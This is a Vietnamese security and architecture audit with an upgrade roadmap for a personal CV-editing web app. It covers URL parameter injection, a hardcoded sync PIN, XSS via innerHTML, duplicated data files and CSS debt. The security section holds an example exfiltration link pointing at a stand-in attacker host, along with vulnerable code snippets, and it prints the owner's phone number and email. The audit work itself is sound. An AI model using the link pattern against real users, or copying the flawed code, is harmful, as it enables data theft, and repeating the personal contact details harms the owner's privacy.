# BÁO CÁO ĐÁNH GIÁ KIẾN TRÚC & KẾ HOẠCH NÂNG CẤP (CV EDITOR)

> **Tài liệu tổng hợp:** Phân tích toàn diện các lỗ hổng bảo mật, nợ kỹ thuật, vấn đề trùng lặp dữ liệu và lộ trình cải tiến hệ thống CV Editor.  
> **Ngày lập:** 08/10/2026  
> **Trạng thái:** Chờ phê duyệt thực thi (Chưa chỉnh sửa mã nguồn)

---

## I. TỔNG QUAN ĐÁNH GIÁ (EXECUTIVE SUMMARY)

Dự án **CV Editor** giải quyết rất tốt bài toán thực tế: may đo CV theo từng vị trí tuyển dụng, hỗ trợ theo dõi tiến độ ứng tuyển (Tracker), soạn email ứng tuyển và ôn luyện phỏng vấn 1-click. Hệ thống sở hữu nhiều điểm cộng kiến trúc đáng giá:
- **Zero-Dependency:** Chạy hoàn toàn trên Vanilla HTML/CSS/JS thuần, tốc độ tải tức thì (<100ms), không phụ thuộc framework cồng kềnh.
- **Whitelist Architecture:** Kiến trúc hiển thị chế độ HR View (`?view=hr`) và chế độ in ấn A4 (`@media print`) dùng Whitelist thay vì Blacklist, ngăn chặn triệt để việc rò rỉ các thành phần giao diện thừa vào bản in.
- **Chủ động phòng chống XSS:** Đã có ý thức bọc hàm `esc()` và `escUrl()` (chặn `javascript:` và `data:`) để làm sạch dữ liệu từ Cloudflare Worker / Groq AI.

Tuy nhiên, do tốc độ phát triển tính năng nhanh (Rapid Prototyping), dự án hiện tồn tại **4 nhóm vấn đề lớn** cần được xử lý theo thứ tự ưu tiên dưới đây.

---

## II. CHI TIẾT CÁC VẤN ĐỀ & PHƯƠNG ÁN XỬ LÝ

### 1. NHÓM 1: BẢO MẬT (ƯU TIÊN CAO NHẤT 🚨)

#### 1.1. Lỗ hổng Parameter Injection qua `?worker=`
- **Hiện trạng:** Trong `js/cv-router.js`, hệ thống đọc tham số `?worker=` từ URL và lưu thẳng vào trình duyệt:
  ```javascript
  const workerParam = params.get('worker');
  if (workerParam) { localStorage.setItem('CV_WORKER_URL', workerParam); }
  ```
- **Rủi ro:** Kẻ tấn công có thể gửi cho bạn một đường link chứa mã độc dạng:  
  `https://dinhanhhhh.github.io/cv-editor/?worker=https://attacker-server.com`  
  Trình duyệt của bạn sẽ ghi đè URL Worker thành máy chủ kẻ tấn công vĩnh viễn. Kể từ thời điểm đó, mọi request lấy bản nháp CV và toàn bộ dữ liệu ứng tuyển (công ty, mức lương, liên hệ HR) đẩy lên cloud sẽ bị gửi thẳng về máy chủ đối phương (Data Exfiltration).
- **Giải pháp xử lý:**
  - **Xóa bỏ hoàn toàn** việc cho phép ghi đè worker URL qua query param `?worker=`.
  - Khóa cứng URL Worker chính thức của dự án: `https://cv-telegram-bridge.tdinhanh-it.workers.dev`.
  - Nếu cần kiểm thử môi trường dev cục bộ, chỉ cho phép whitelist cứng: `http://localhost:8787` hoặc domain kết thúc bằng `.tdinhanh-it.workers.dev`.

---

#### 1.2. Mã PIN đồng bộ Tracker hardcode & lộ qua Query String
- **Hiện trạng:**
  - File `js/cv-tracker.js` đang hardcode mã PIN mặc định `"dinhanh2026"`.
  - Việc gọi API Cloudflare KV đang truyền PIN qua URL: `GET/POST /api/tracker?pin=dinhanh2026`.
- **Rủi ro:**
  - Nếu mã nguồn công khai (Public Repo), bất kỳ ai cũng biết mã PIN này.
  - Query string bị lưu vết tự động trong lịch sử duyệt web (Browser History) và nhật ký truy cập (Cloudflare Access Logs). Bất kỳ ai có mã PIN đều có thể gửi request để đọc hoặc ghi đè toàn bộ danh sách ứng tuyển của bạn.
- **Giải pháp xử lý:**
  - Không truyền PIN qua query string. Chuyển sang truyền bằng Request Header: `X-Tracker-Pin: <pin>` hoặc `Authorization: Bearer <pin>`.
  - Xóa bỏ mã PIN mặc định trong client code. Khi bấm "Đồng bộ đám mây" lần đầu, hiển thị modal popup để người dùng tự nhập mã PIN cá nhân (lưu trong `localStorage` máy đó).
  - Trên Cloudflare Worker: Đặt Secret hash hoặc quản lý namespace bảo vệ endpoint `/api/tracker`.

---

#### 1.3. Lỗ hổng Self-XSS tại `showSyncStatus` & Rà soát 39 vị trí `innerHTML`
- **Hiện trạng:** Trong `cv-tracker.js`, hàm `showSyncStatus` đang nhét trực tiếp `${pin}` vào chuỗi HTML:
  ```javascript
  // Lỗi: nhét trực tiếp không qua esc()
  syncStatusEl.innerHTML = `Đang đồng bộ với mã PIN: ${pin}...`;
  ```
  Ngoài ra, trong `cv-renderer.js` có khoảng 39 vị trí sử dụng `innerHTML`.
- **Rủi ro:** Dù người dùng tự gõ PIN (Self-XSS), việc đưa biến chưa qua lọc vào `innerHTML` vi phạm nghiêm trọng chuẩn mực an toàn mã nguồn.
- **Giải pháp xử lý:**
  - Bọc `esc(pin)` trước khi render ra HTML.
  - Rà soát toàn bộ 39 vị trí `innerHTML` trong `cv-renderer.js` để đảm bảo 100% các biến động đều đi qua hàm `esc()` và `escUrl()`.

---

#### 1.4. Dữ liệu cá nhân (PII) nằm trong ~50 file data
- **Hiện trạng:** Số điện thoại `0923202861` và email `tdinhanh.it@gmail.com` xuất hiện lặp lại trong hơn 50 file `data/cv-data-*.js`.
- **Rủi ro:** Nếu repository ở chế độ Public, các web scraper tự động của bên thứ ba sẽ cào số điện thoại và email vào danh sách spam quảng cáo.
- **Giải pháp xử lý:**
  - Nếu repository là Public: Ẩn 3 số cuối điện thoại trong template mặc định trên git (ví dụ `0923.xxx.861`), chỉ nạp số thật khi xuất file trên máy cá nhân.
  - Hoặc chuyển repository sang chế độ **Private** (vẫn deploy GitHub Pages bình thường qua GitHub Actions hoặc cài đặt repo).

---

### 2. NHÓM 2: TRÙNG LẶP DỮ LIỆU (DATA DUPLICATION)

#### 2.1. Nỗi đau bảo trì ~50 file `cv-data-*.js` độc lập
- **Hiện trạng:** Hiện có khoảng 50 file dữ liệu, mỗi file nặng 12–20KB. Các thông tin cốt lõi (Học vấn ĐH Mở, Thực tập Tami Technology, liên hệ, mô tả các dự án lớn) giống nhau tới 85%.
- **Hệ quả:** Mỗi lần muốn cập nhật một tiêu chuẩn (ví dụ: chuẩn hóa role `"Developer"`, chỉnh lại ngày thực tập Tami `"06/2025 - 12/2025"`), bạn phải chạy script đồng bộ hàng loạt (`sync-skills-titles.js`), rất dễ phát sinh sai lệch giữa các file.

#### 2.2. Giải pháp: Kiến trúc Base + Override (Runtime DeepMerge)
Dự án theo đuổi triết lý **Zero-build** (không dùng Webpack/Vite build phức tạp), do đó giải pháp tối ưu nhất là nạp theo cơ chế **Base Template + Job Specific Override**:

```
data/
├── cv-data-base.js             <-- Chứa 100% dữ liệu chuẩn chung (Edu, Tami Exp, Core Contact, Master Projects Pool)
└── overrides/
    ├── cv-override-greenbio.js  <-- Chỉ chứa phần may đo riêng (20-30 dòng)
    ├── cv-override-ezgames.js
    └── cv-override-phatkiengia.js
```

**Ví dụ nội dung file Override (`cv-override-greenbio.js`):**
```javascript
var cvOverride = {
  vi: {
    title: "Thực tập sinh Phát triển Web",
    objective: "Tóm tắt chuyên môn may đo riêng cho Green Bio tập trung Python, REST API, Docker...",
    selectedProjects: ["job-portal", "student-management"],
    skills: [
      { cat: "Backend & API", items: "Python, Django, FastAPI, RESTful API, PostgreSQL" },
      { cat: "Frontend", items: "React.js, Next.js, TypeScript" },
      { cat: "Databases & Tools", items: "PostgreSQL, MySQL, 3NF, Indexing, Docker, Git" }
    ]
  }
};
```
- **Cơ chế:** Khi router tải trang, nó nạp `cv-data-base.js` trước, nạp `cv-override-*.js` sau, rồi gọi hàm `deepMerge(cvBaseData, cvOverride)`.
- **Lợi ích:** Muốn sửa thông tin học vấn hay kinh nghiệm chuẩn, **chỉ cần sửa đúng 1 chỗ duy nhất** ở `cv-data-base.js`.

---

### 3. NHÓM 3: NỢ KỸ THUẬT (TECHNICAL DEBT)

#### 3.1. `cv-layout.css` dài 8.2k dòng và lạm dụng 942 lần `!important`
- **Hiện trạng:** File CSS phình to với gần 1.000 khai báo `!important`. Đây là kết quả của việc ghi đè CSS theo thời gian (specificity war).
- **Giải pháp:**
  - Không đập đi viết lại một lần (tránh nguy cơ layout shift và vỡ căn trang A4).
  - Khai báo lại các biến màu sắc, spacing vào `:root`.
  - Ứng dụng **CSS Cascade Layers** (`@layer base, layout, components, utilities, overrides;`) để triệt tiêu việc phải dùng `!important`.

#### 3.2. `cv-renderer.js` dài 3.6k dòng với 45 hàm và state toàn cục
- **Hiện trạng:** Một file gánh quá nhiều trách nhiệm: Dựng HTML, Thước đo A4 Fit Meter, Logic Live-Edit, So sánh Diff 2 bản CV, Bộ chọn dự án (Project Selector).
- **Giải pháp module hóa (không cần bundler):**
  - `js/cv-renderer.js`: Giữ lại thuần túy logic render HTML của tờ CV (~1.000 dòng).
  - `js/cv-a4-metrics.js`: Tách toàn bộ logic đo đạc chiều cao, Magic Fit, A4 Progress Meter.
  - `js/cv-diff.js`: Tách modal so sánh 2 phiên bản CV.
  - `js/cv-live-edit.js`: Tách logic contenteditable và lưu nháp local.

#### 3.3. Dọn dẹp các workflow và file rác không thuộc về project
- **Hiện trạng:**
  - Trong thư mục `.gemini/` đang tồn tại các file hướng dẫn (workflow) của project Next.js/Tailwind/Framer Motion rớt lại từ dự án khác.
  - Các thư mục rác: `archive_legacy/` (17 file html cũ), `scratch/`, `test_results.json`.
- **Giải pháp:**
  - Xóa bỏ hoặc viết lại các workflow trong `.gemini/` cho đúng stack Vanilla JS của repo này.
  - Đưa `archive_legacy/`, `scratch/`, `test_results.json` vào `.gitignore` hoặc xóa dọn dẹp.

#### 3.4. Cache-busting thủ công (`?v=1.2.6`)
- **Hiện trạng:** Đang phải gõ tay version query string trong `index.html`. Nếu quên bump version, trình duyệt người dùng sẽ bị lỗi cache chạy code cũ (như lỗi trắng màn hình vừa gặp).
- **Giải pháp:**
  - Bổ sung các thẻ `<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">` trong `index.html`.
  - Sử dụng GitHub Actions script tự động gắn hash commit ngắn (`git rev-parse --short HEAD`) vào các file JS/CSS khi deploy lên GitHub Pages.

---

### 4. NHÓM 4: TINH CHỈNH SẢN PHẨM & TRẢI NGHIỆM

#### 4.1. Tinh chỉnh tài liệu `UPGRADE_RESULTS.md`
- Chuyển văn phong từ "quảng cáo / marketing" sang phong cách tài liệu kỹ thuật chuẩn mực: Đo lường bằng số liệu thực tế (thời gian nạp trang <80ms, 0 dependency, dung lượng DOM vừa vặn 1 trang A4).

#### 4.2. Cảnh báo số liệu trong tính năng "CV Health"
- Thêm chú thích rõ ràng trong giao diện tính điểm CV Health:  
  *“Chỉ điền số liệu khi bạn có kết quả đo lường thực tế từ dự án (benchmark, latency, users, tests). Tuyệt đối không tự bịa số liệu chỉ để tối ưu điểm Health.”* Điều này giúp ứng viên giữ vững tính trung thực khi phỏng vấn.

---

## III. LỘ TRÌNH THỰC HIỆN ĐỀ XUẤT (ACTION ROADMAP)

```
[Phase 1: Bảo mật cấp bách] ──> [Phase 2: Dọn dẹp nợ kỹ thuật] ──> [Phase 3: Kiến trúc Base + Override]
  • Khóa cứng Worker URL          • Xóa workflow Next.js rác         • Xây dựng cv-data-base.js
  • Chuyển PIN sang Header        • Dọn dẹp .gitignore               • Chuyển đổi file data sang Override
  • Bọc esc() 100% innerHTML      • Tách module cv-renderer.js       • Triệt tiêu sync script cồng kềnh
```

### ✅ Checklist công việc chi tiết:

- [x] **Phase 1: Vá lỗ hổng bảo mật (Đã hoàn thành ✅)**
  - [x] Xóa bỏ tham số `?worker=` và dọn dẹp localStorage trong `js/cv-router.js`.
  - [x] Chuyển PIN sang Request Header (`X-Tracker-Pin`), xóa bỏ hardcode `dinhanh2026` trong `js/cv-tracker.js` & `cloudflare-worker.js`.
  - [x] Bọc `esc()` cho `${pin}` tại `showSyncStatus` và rà soát an toàn các vị trí `innerHTML`.
  - [x] Đã khóa cứng domain Worker chính thức, hỗ trợ CORS header `X-Tracker-Pin`.
  - [ ] Kiểm tra và ẩn thông tin nhạy cảm trước khi công khai repo.

- [x] **Phase 2: Dọn dẹp file & Module hóa (Nhóm 3 - Đã hoàn thành ✅)**
  - [x] Chuẩn hóa các file workflow trong `.gemini/` về Vanilla JS & zero-build stack (loại bỏ template Next.js/Tailwind).
  - [x] Cập nhật `.gitignore` cho `archive_legacy/`, `scratch/`, `test_results.json`, `*.log`, `Thumbs.db`.
  - [x] Tách thành công `js/cv-a4-metrics.js` (A4 Fit Meter & Magic Fit Engine) và `js/cv-diff.js` (CV Version Diff Viewer) ra khỏi file nguyên khối `js/cv-renderer.js` (giảm >700 dòng code cồng kềnh).
  - [x] Tích hợp và kiểm thử trực tiếp trên trình duyệt: cả 2 module hoạt động trơn tru, không lỗi console, pass 100% `verify-cv-data.js`.

- [x] **Phase 3: Tái cấu trúc dữ liệu Base + Override (Nhóm 2 - Đã hoàn thành ✅)**
  - [x] Thiết kế `data/cv-data-base.js` chuẩn hóa (Single Source of Truth cho Name, Contact, Education, Tami Exp, Master Projects).
  - [x] Xây dựng hàm `mergeWithBaseCv()` (Runtime DeepMerge) hỗ trợ cả Browser và Node.js.
  - [x] Tích hợp tự động nạp & hợp nhất trong `js/cv-router.js` (cả chế độ bình thường lẫn bản nháp KV draft) và `index.html`.
  - [x] Cập nhật bộ kiểm tra `scripts/verify-cv-data.js` tương thích 100% với định dạng Base + Override.
  - [x] Nâng cấp `scripts/new-cv.js` tự động sinh bản CV mới theo định dạng Override siêu nhẹ.
  - [x] Chuyển đổi thành công 3 file may đo thực tế (`cv-data-greenbio.js`, `cv-data-ezgames.js`, `cv-data-lienkhuong.js`) sang định dạng Override, loại bỏ hoàn toàn mã trùng lặp.

- [x] **Phase 4: Tinh chỉnh sản phẩm & Trải nghiệm (Nhóm 4 - Đã hoàn thành ✅)**
  - [x] Thêm thẻ meta `Cache-Control` (`no-cache, no-store, must-revalidate`) trong `index.html` ngăn chặn lỗi cache cũ.
  - [x] Thêm cảnh báo trung thực số liệu bắt buộc trong công cụ **CV Health / ATS Audit Scorecard** (`js/cv-pro-tools.js`), ngăn chặn bịa số liệu ảo khi ứng tuyển.
  - [x] Viết lại tài liệu `UPGRADE_RESULTS.md` theo phong cách báo cáo kỹ thuật chuẩn mực, đo lường bằng số liệu định lượng thực tế.
